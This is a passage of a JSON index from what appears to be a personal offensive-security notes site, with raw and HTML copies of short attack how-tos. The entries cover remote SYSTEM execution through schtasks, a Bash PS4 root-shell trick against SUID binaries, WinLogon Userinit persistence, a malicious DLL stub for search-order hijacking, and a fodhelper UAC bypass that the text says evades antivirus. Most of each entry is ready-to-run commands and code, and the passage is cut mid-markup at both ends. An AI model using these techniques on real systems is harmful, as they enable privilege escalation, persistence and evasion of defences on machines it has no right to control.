data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; 445) or NetBIOS (&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; 139). (In fact, this is how &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-Windows-tasks&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Exploit-Windows-tasks&quot;&gt;schtasks.exe&lt;/a&gt; works locally as well; the only difference is that in this case a local named pipe is always used.)&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Create $ATTACKER_TASK on the $TARGET_HOST. Note that /sd&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# (start date) and /st (start time) don&#039;t matter if we&#039;re&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# invoking the task manually, as we do next.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;schtasks &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;s &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;RU &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;SYSTEM&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;create &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;         /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;tn &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ATTACKER_TASK&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;tr &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;SOME_COMMAND&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;sc ONCE &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;         /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;sd &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;06&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;25&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;2023&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;st &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;16&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;10&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Invoke $ATTACKER_TASK.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;schtasks &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;s &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;run &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;TN &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ATTACKER_TASK&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Clean up after yourself.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;schtasks &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;S &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;TN &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ATTACKER_TASK&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;DELETE &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;F&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Exploit-the-Bash-PS4-prompt":{"slug":"spells/Exploit-the-Bash-PS4-prompt","filePath":"spells/Exploit the Bash PS4 prompt.md","title":"How to exploit the Bash PS4 (debugging) prompt","links":[],"tags":["Language/Bash","AttackCycle/PrivEsc","HowTo"],"content":"\n\n                  \n                  Warning\n                  \n                \n\n\nThis only works on versions of Bash before v4.4!\n\n\n\nWhen Bash is in debugging mode (SHELLOPTS=xtrace), the $PS4 prompt is used to display debugging information.\nIt would appear that this prompt somehow inherits the permissions of the executable being run. This includes SUID/SGID permissions (at least for Bash &lt; 4.4)!\nIf you have access to a SUID/SGID executable, this can be abused to create root shells:\nenv -i \\\nSHELLOPTS=xtrace \\\nPS4=&#039;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#039; \\\n/path/to/suid/executable\nAgain, this only works if the calling application is relying on the current shell for helper execution.","richContent":"&lt;blockquote class=&quot;callout warning&quot; data-callout=&quot;warning&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Warning&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;This only works on versions of Bash &lt;em&gt;before&lt;/em&gt; v4.4!&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;When Bash is in debugging mode (&lt;code&gt;SHELLOPTS=xtrace&lt;/code&gt;), the &lt;code&gt;$PS4&lt;/code&gt; prompt is used to display debugging information.&lt;/p&gt;\n&lt;p&gt;&lt;em&gt;It would appear that this prompt somehow inherits the permissions of the executable being run.&lt;/em&gt; This includes SUID/SGID permissions (at least for Bash &amp;#x3C; 4.4)!&lt;/p&gt;\n&lt;p&gt;If you have access to a SUID/SGID executable, this can be abused to create root shells:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;env&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;SHELLOPTS=xtrace &lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;PS4=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;/path/to/suid/executable&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Again, this only works &lt;em&gt;if&lt;/em&gt; the calling application is relying on the current shell for helper execution.&lt;/p&gt;"},"spells/Exploit-the-WinLogon-initialization-sequence":{"slug":"spells/Exploit-the-WinLogon-initialization-sequence","filePath":"spells/Exploit the WinLogon initialization sequence.md","title":"Exploit the WinLogon initialization sequence","links":[],"tags":["OS/Windows/WinLogin","OS/Windows/Registry","AttackCycle/Exploitation","HowTo"],"content":"WinLogin is a Windows component that loads a user profile right after authentication (amongst other things). The WinLogin initialization sequence is defined in the HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\\ registry key. This will contain two values:\n\nUserinit, which points to userinit.exe, and\nshell which usually points to explorer.exe.\n\nDo not replace these files! Instead, follow the initial command with your payload, separating the two with a comma:\nC:\\Windows\\System32\\userinit.exe,C:\\Windows\\System32\\evil.exe\n","richContent":"&lt;p&gt;WinLogin is a Windows component that loads a user profile right after authentication (amongst other things). The WinLogin initialization sequence is defined in the &lt;code&gt;HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\\&lt;/code&gt; registry key. This will contain two values:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;Userinit&lt;/code&gt;, which points to userinit.exe, and&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;shell&lt;/code&gt; which usually points to explorer.exe.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;&lt;strong&gt;Do not replace these files!&lt;/strong&gt; Instead, follow the initial command with your payload, separating the two with a comma:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;C:\\Windows\\System32\\userinit.exe,C:\\Windows\\System32\\evil.exe\n&lt;/code&gt;&lt;/pre&gt;"},"spells/Exploit-the-Windows-DLL-search-order":{"slug":"spells/Exploit-the-Windows-DLL-search-order","filePath":"spells/Exploit the Windows DLL search order.md","title":"Exploit the Windows DLL search order","links":["spells/Windows-DLL-search-order","spells/Exploit-LD_LIBRARY_PATH"],"tags":["AttackCycle/Exploitation","HowTo","OS/Windows"],"content":"Exploiting the Windows DLL search order is basically the same idea as exploiting the LD_LIBRARY_PATH on Linux.\nA stub malicious DLL:\n#include &lt;windows.h&gt;\n \nBOOL WINAPI DllMain\n(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {\n\tif (dwReason == DLL_PROCESS_ATTACH) {\n\t\tsystem(&quot;cmd.exe /C whoami &gt; C:\\Temp\\dll.txt&quot;);\n\t\tExitProcess(0);\n\t}\n\treturn TRUE;\n}\nCompile with mingw (on Linux!):\nx86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll","richContent":"&lt;p&gt;Exploiting the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Windows-DLL-search-order&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Windows-DLL-search-order&quot;&gt;Windows DLL search order&lt;/a&gt; is basically the same idea as &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-LD_LIBRARY_PATH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Exploit-LD_LIBRARY_PATH&quot;&gt;exploiting the LD_LIBRARY_PATH on Linux&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;A stub malicious DLL:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;c&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;c&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;include&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;windows.h&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;BOOL WINAPI DllMain&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;HANDLE hDll&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; DWORD dwReason&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; LPVOID lpReserved&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;dwReason &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;==&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; DLL_PROCESS_ATTACH&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\t\tsystem&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;cmd.exe /C whoami &gt; C:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic&quot;&gt;\\T&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;emp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic&quot;&gt;\\d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ll.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\t\tExitProcess&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\treturn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; TRUE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Compile with mingw (on Linux!):&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;x86_64-w64-mingw32-gcc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; windows_dll.c&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -shared&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; output.dll&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Exploit-the-Windows-FoDHelper":{"slug":"spells/Exploit-the-Windows-FoDHelper","filePath":"spells/Exploit the Windows FoDHelper.md","title":"Exploit the Windows “Feature on Demand” Helper","links":[],"tags":["OS/Windows/Registry","AttackCycle/PrivEsc","HowTo"],"content":"The fodhelper binary can be abused to gain an admin shell on Windows boxes with a couple of registry key changes. They key (heh) here is to use the CurVer registry key to point fodhelper.exe to a different registry location; otherwise most AV solutions will catch this change and block it (though sometimes the command will still execute).\nNew-Item &quot;HKCU:\\Software\\Classes\\.pwn\\Shell\\Open\\command&quot; -Force\nSet-ItemProperty &quot;HKCU:\\Software\\Classes\\.pwn\\Shell\\Open\\command&quot; `\n\t-Name &quot;(default)&quot; -Value &quot;cmd.exe /c start powershell.exe&quot; -Force\n    \nNew-Item -Path &quot;HKCU:\\Software\\Classes\\ms-settings\\CurVer&quot; -Force\nSet-ItemProperty  &quot;HKCU:\\Software\\Classes\\ms-settings\\CurVer&quot; `\n\t-Name &quot;(default)&quot; -value &quot;.pwn&quot; -Force","richContent":"&lt;p&gt;&lt;a href=&quot;https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;The fodhelper binary can be abused to gain an admin shell on Windows boxes with a couple of registry key changes.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; They key (heh) here is to use the CurVer registry key to point fodhelper.exe to a different registry location; otherwise most AV solutions will catch this change and block it (though sometimes the command will still execute).&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;New-Item&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;HKCU:\\Software\\Classes\\.pwn\\Shell\\Open\\command&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Force&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Set-ItemProperty&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;HKCU:\\Software\\Classes\\.pwn\\Shell\\Open\\command&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Name &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;(default)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Value &lt;/span&gt;&lt;span 